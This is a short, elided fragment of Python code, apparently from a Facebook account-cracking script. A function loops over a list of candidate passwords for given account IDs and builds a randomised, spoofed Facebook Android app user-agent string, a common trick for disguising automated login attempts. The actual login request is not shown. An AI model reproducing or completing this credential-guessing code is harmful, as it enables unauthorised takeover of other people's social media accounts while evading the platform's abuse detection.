...
def DHANU_f_m1(ids,names,pswdx):
    try:
        ...
        for passx in pswdx:
            ...
            uaD1 = f"Dalvik/2.1.0 (Linux; U; Android "+str(random.randint(4,14))+"; X655C Build/TP1A."+str(random.randint(111111,999999))+"."+str(random.randint(10,999))+"[FBAN/FB4A;FBAV/260.0.0.42.118;FBBV/201518826;FBDM/{density=3.375,width=1080,height=2058};FBLC/en_US;FBRV/203119134;FBCR/Verizon ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G965U;FBSV/10;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
